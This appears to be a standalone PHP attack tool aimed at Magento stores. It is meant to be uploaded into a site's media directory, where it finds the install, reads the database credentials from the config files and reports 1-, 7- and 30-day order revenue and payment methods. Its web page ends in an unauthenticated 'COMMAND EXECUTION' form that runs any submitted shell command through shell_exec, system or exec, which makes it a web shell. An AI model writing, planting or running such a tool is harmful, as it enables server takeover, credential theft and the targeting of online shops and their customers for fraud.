#!/usr/bin/env php
<?php
/**
 * Magento Order & Revenue Scanner
 * VENI VIDI VICI
 * 
 * Dual Mode: CLI + Web GUI
 * Auto-detects Magento root from any directory
 * Extracts order statistics and payment methods
 * 
 * CLI Usage: php magez.php
 * Web Usage: Access via browser
 */

error_reporting(0);
ini_set('display_errors', 0);
ini_set('memory_limit', '512M');

$isCLI = (php_sapi_name() === 'cli');

// ============================================
// AUTO-DETECT MAGENTO ROOT (grab.php style)
// ============================================
function findMagentoRoot() {
    // Try relative paths (up to 10 levels)
    for ($i = 0; $i <= 10; $i++) {
        $prefix = str_repeat('../', $i);
        
        // Check for Magento 2 (env.php)
        if (file_exists($prefix . 'app/etc/env.php')) {
            return [
                'root' => realpath($prefix),
                'version' => 'M2',
                'config_file' => realpath($prefix . 'app/etc/env.php')
            ];
        }
        
        // Check for Magento 1 (local.xml)
        if (file_exists($prefix . 'app/etc/local.xml')) {
            return [
                'root' => realpath($prefix),
                'version' => 'M1',
                'config_file' => realpath($prefix . 'app/etc/local.xml')
            ];
        }
    }
    
    // Try common absolute paths
    $common_paths = [
        '/var/www/html',
        '/var/www/magento',
        '/var/www/magento2',
        '/home/magento/public_html',
        $_SERVER['DOCUMENT_ROOT'] ?? ''
    ];
    
    foreach ($common_paths as $path) {
        if (file_exists($path . '/app/etc/env.php')) {
            return [
                'root' => $path,
                'version' => 'M2',
                'config_file' => $path . '/app/etc/env.php'
            ];
        }
        if (file_exists($path . '/app/etc/local.xml')) {
            return [
                'root' => $path,
                'version' => 'M1',
                'config_file' => $path . '/app/etc/local.xml'
            ];
        }
    }
    
    return null;
}

$magento = findMagentoRoot();

if (!$magento) {
    if ($isCLI) {
        echo "ERROR: Magento root not found\n";
        exit(1);
    } else {
        die("<h1>Error</h1><p>Magento root not found. Upload this file to Magento media directory.</p>");
    }
}

// ============================================
// LOAD DATABASE CREDENTIALS
// ============================================
function loadDbCredentials($magento) {
    if ($magento['version'] === 'M2') {
        // Magento 2: env.php
        $env = include($magento['config_file']);
        $dbConf = $env['db']['connection']['default'] ?? [];
        
        return [
            'host' => $dbConf['host'] ?? 'localhost',
            'user' => $dbConf['username'] ?? '',
            'pass' => $dbConf['password'] ?? '',
            'dbname' => $dbConf['dbname'] ?? '',
            'prefix' => $env['db']['table_prefix'] ?? ''
        ];
    } else {
        // Magento 1: local.xml
        $xml = file_get_contents($magento['config_file']);
        $xml = preg_replace('/<!--(.*?)-->/is', '', $xml);
        
        preg_match('/<host><!\[CDATA\[(.*?)\]\]><\/host>/i', $xml, $host);
        preg_match('/<username><!\[CDATA\[(.*?)\]\]><\/username>/i', $xml, $user);
        preg_match('/<password><!\[CDATA\[(.*?)\]\]><\/password>/i', $xml, $pass);
        preg_match('/<dbname><!\[CDATA\[(.*?)\]\]><\/dbname>/i', $xml, $dbname);
        preg_match('/<table_prefix><!\[CDATA\[(.*?)\]\]><\/table_prefix>/i', $xml, $prefix);
        
        return [
            'host' => $host[1] ?? 'localhost',
            'user' => $user[1] ?? '',
            'pass' => $pass[1] ?? '',
            'dbname' => $dbname[1] ?? '',
            'prefix' => $prefix[1] ?? ''
        ];
    }
}

$dbCreds = loadDbCredentials($magento);

// ============================================
// DATABASE CONNECTION
// ============================================
$conn = null;
try {
    $conn = new mysqli(
        $dbCreds['host'],
        $dbCreds['user'],
        $dbCreds['pass'],
        $dbCreds['dbname']
    );
    
    if ($conn->connect_error) {
        throw new Exception($conn->connect_error);
    }
    
    $conn->set_charset('utf8');
} catch (Exception $e) {
    if ($isCLI) {
        echo "DB Connection Failed: " . $e->getMessage() . "\n";
        exit(1);
    } else {
        die("<h1>Error</h1><p>Database connection failed: " . htmlspecialchars($e->getMessage()) . "</p>");
    }
}

// ============================================
// FETCH ORDER STATISTICS
// ============================================
function getOrderStats($conn, $prefix, $version, $days) {
    $table = ($version === 'M2') ? 'sales_order' : 'sales_flat_order';
    $paymentTable = ($version === 'M2') ? 'sales_order_payment' : 'sales_flat_order_payment';
    
    // Get count and total
    $query = "SELECT 
                COUNT(*) as order_count,
                SUM(base_grand_total) as total_revenue,
                AVG(base_grand_total) as avg_order
              FROM `{$prefix}{$table}` 
              WHERE created_at > DATE_SUB(NOW(), INTERVAL {$days} DAY)";
    
    $result = $conn->query($query);
    $stats = $result->fetch_assoc();
    
    // Get payment methods
    $query2 = "SELECT p.method, COUNT(*) as count, SUM(o.base_grand_total) as revenue
               FROM `{$prefix}{$table}` o
               JOIN `{$prefix}{$paymentTable}` p ON o.entity_id = p.parent_id
               WHERE o.created_at > DATE_SUB(NOW(), INTERVAL {$days} DAY)
               GROUP BY p.method
               ORDER BY count DESC";
    
    $result2 = $conn->query($query2);
    $methods = [];
    while ($row = $result2->fetch_assoc()) {
        $methods[] = $row;
    }
    
    return [
        'count' => (int)$stats['order_count'],
        'revenue' => (float)$stats['total_revenue'],
        'avg' => (float)$stats['avg_order'],
        'methods' => $methods
    ];
}

$stats1d = getOrderStats($conn, $dbCreds['prefix'], $magento['version'], 1);
$stats7d = getOrderStats($conn, $dbCreds['prefix'], $magento['version'], 7);
$stats30d = getOrderStats($conn, $dbCreds['prefix'], $magento['version'], 30);

// ============================================
// CLI OUTPUT
// ============================================
if ($isCLI) {
    echo "════════════════════════════════════════════════════════════════\n";
    echo "MAGENTO CONTROL PANEL - VENI VIDI VICI\n";
    echo "════════════════════════════════════════════════════════════════\n\n";
    
    echo "Magento Root: {$magento['root']}\n";
    echo "Version: {$magento['version']}\n";
    echo "Database: {$dbCreds['dbname']}\n";
    echo "Prefix: {$dbCreds['prefix']}\n\n";
    
    echo "════════════════════════════════════════════════════════════════\n";
    echo "ORDER STATISTICS\n";
    echo "════════════════════════════════════════════════════════════════\n\n";
    
    echo "Daily (24h):   {$stats1d['count']} orders  |  $" . number_format($stats1d['revenue'], 2) . "  |  Avg: $" . number_format($stats1d['avg'], 2) . "\n";
    echo "Weekly (7d):   {$stats7d['count']} orders  |  $" . number_format($stats7d['revenue'], 2) . "  |  Avg: $" . number_format($stats7d['avg'], 2) . "\n";
    echo "Monthly (30d): {$stats30d['count']} orders  |  $" . number_format($stats30d['revenue'], 2) . "  |  Avg: $" . number_format($stats30d['avg'], 2) . "\n\n";
    
    echo "PAYMENT METHODS (30 days):\n";
    echo "────────────────────────────────────────────────────────────────\n";
    
    $totalOrders = $stats30d['count'];
    foreach ($stats30d['methods'] as $method) {
        $percentage = $totalOrders > 0 ? ($method['count'] / $totalOrders) * 100 : 0;
        echo sprintf("  • %-30s %5d orders  $%-12s (%.2f%%)\n",
            $method['method'] . ':',
            $method['count'],
            number_format($method['revenue'], 2),
            $percentage
        );
    }
    
    echo "\n════════════════════════════════════════════════════════════════\n";
    exit(0);
}

// ============================================
// WEB GUI OUTPUT
// ============================================
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Magento Scanner</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #00ff00; 
            font-family: 'Courier New', monospace; 
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { 
            color: #00ff00; 
            text-align: center; 
            margin-bottom: 10px;
            font-size: 2em;
            text-shadow: 0 0 10px #00ff00;
        }
        .subtitle {
            text-align: center;
            color: #ffff00;
            margin-bottom: 30px;
        }
        .info-box {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px solid #333;
        }
        .info-label { color: #ffff00; }
        .info-value { color: #00ff00; }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        th {
            background: #1a1a1a;
            color: #ffff00;
            padding: 10px;
            text-align: left;
            border: 1px solid #00ff00;
        }
        td {
            padding: 10px;
            border: 1px solid #333;
        }
        .stat-box {
            display: inline-block;
            background: #1a1a1a;
            border: 1px solid #00ff00;
            padding: 15px 25px;
            margin: 10px;
            border-radius: 5px;
            text-align: center;
        }
        .stat-label {
            color: #ffff00;
            font-size: 0.9em;
            margin-bottom: 5px;
        }
        .stat-value {
            color: #00ff00;
            font-size: 1.3em;
            font-weight: bold;
        }
        .payment-item {
            padding: 8px;
            margin: 5px 0;
            background: #1a1a1a;
            border-left: 3px solid #00ff00;
        }
        hr { border: 0; border-top: 1px solid #00ff00; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>MAGENTO CONTROL PANEL</h1>
        <div class="subtitle">VENI VIDI VICI</div>
        
        <div class="info-box">
            <div class="info-row">
                <span class="info-label">Magento Root:</span>
                <span class="info-value"><?php echo htmlspecialchars($magento['root']); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Version:</span>
                <span class="info-value"><?php echo $magento['version']; ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Database:</span>
                <span class="info-value"><?php echo htmlspecialchars($dbCreds['dbname']); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Table Prefix:</span>
                <span class="info-value"><?php echo htmlspecialchars($dbCreds['prefix'] ?: 'none'); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Connection:</span>
                <span class="info-value" style="color: #00ff00;">CONNECTED</span>
            </div>
        </div>

        <hr>

        <h2 style="color: #ffff00; margin: 20px 0;">ORDER STATISTICS</h2>
        
        <div style="text-align: center;">
            <div class="stat-box">
                <div class="stat-label">DAILY (24 Hours)</div>
                <div class="stat-value"><?php echo $stats1d['count']; ?> orders</div>
                <div class="stat-value" style="color: #ffff00;">$<?php echo number_format($stats1d['revenue'], 2); ?></div>
                <div style="color: #888; font-size: 0.8em; margin-top: 5px;">Avg: $<?php echo number_format($stats1d['avg'], 2); ?></div>
            </div>
            
            <div class="stat-box">
                <div class="stat-label">WEEKLY (7 Days)</div>
                <div class="stat-value"><?php echo $stats7d['count']; ?> orders</div>
                <div class="stat-value" style="color: #ffff00;">$<?php echo number_format($stats7d['revenue'], 2); ?></div>
                <div style="color: #888; font-size: 0.8em; margin-top: 5px;">Avg: $<?php echo number_format($stats7d['avg'], 2); ?></div>
            </div>
            
            <div class="stat-box">
                <div class="stat-label">MONTHLY (30 Days)</div>
                <div class="stat-value"><?php echo $stats30d['count']; ?> orders</div>
                <div class="stat-value" style="color: #ffff00;">$<?php echo number_format($stats30d['revenue'], 2); ?></div>
                <div style="color: #888; font-size: 0.8em; margin-top: 5px;">Avg: $<?php echo number_format($stats30d['avg'], 2); ?></div>
            </div>
        </div>

        <hr>

        <h2 style="color: #ffff00; margin: 20px 0;">PAYMENT METHODS (30 Days)</h2>
        
        <?php
        $totalOrders = $stats30d['count'];
        foreach ($stats30d['methods'] as $method) {
            $percentage = $totalOrders > 0 ? ($method['count'] / $totalOrders) * 100 : 0;
            echo "<div class='payment-item'>";
            echo "<strong style='color: #00ff00;'>{$method['method']}</strong> ";
            echo "<span style='color: #ffff00;'>{$method['count']} orders</span> ";
            echo "<span style='color: #fff;'>($" . number_format($method['revenue'], 2) . ")</span> ";
            echo "<span style='color: #888;'>" . number_format($percentage, 2) . "%</span>";
            echo "</div>";
        }
        ?>

        <hr>

        <div style="margin-top: 30px; padding: 15px; background: #1a1a1a; border: 1px solid #333; border-radius: 5px;">
            <h3 style="color: #ffff00; margin-bottom: 10px;">COMMAND EXECUTION</h3>
            <form method="GET" style="margin-bottom: 15px;">
                <input type="text" name="cmd" placeholder="Enter command (e.g., whoami, id, ls -la)" 
                       style="width: 80%; padding: 8px; background: #0a0a0a; border: 1px solid #00ff00; color: #00ff00; font-family: monospace;">
                <input type="submit" value="Execute" 
                       style="padding: 8px 20px; background: #00ff00; border: none; color: #000; font-weight: bold; cursor: pointer;">
            </form>
            
            <?php if (isset($_GET['cmd']) && $_GET['cmd'] !== ''): ?>
                <div style="background: #0a0a0a; padding: 10px; border: 1px solid #00ff00; border-radius: 3px; margin-top: 10px;">
                    <div style="color: #ffff00; margin-bottom: 5px;">Output:</div>
                    <pre style="color: #00ff00; white-space: pre-wrap; word-wrap: break-word;"><?php
                        $cmd = $_GET['cmd'];
                        if (function_exists('shell_exec')) {
                            echo htmlspecialchars(shell_exec($cmd));
                        } elseif (function_exists('system')) {
                            ob_start();
                            system($cmd);
                            echo htmlspecialchars(ob_get_clean());
                        } elseif (function_exists('exec')) {
                            exec($cmd, $output);
                            echo htmlspecialchars(implode("\n", $output));
                        } else {
                            echo "No execution functions available";
                        }
                    ?></pre>
                </div>
            <?php endif; ?>
        </div>

        <div style="text-align: center; margin-top: 30px; color: #888; font-size: 0.9em;">
            VENI VIDI VICI
        </div>
    </div>
</body>
</html>
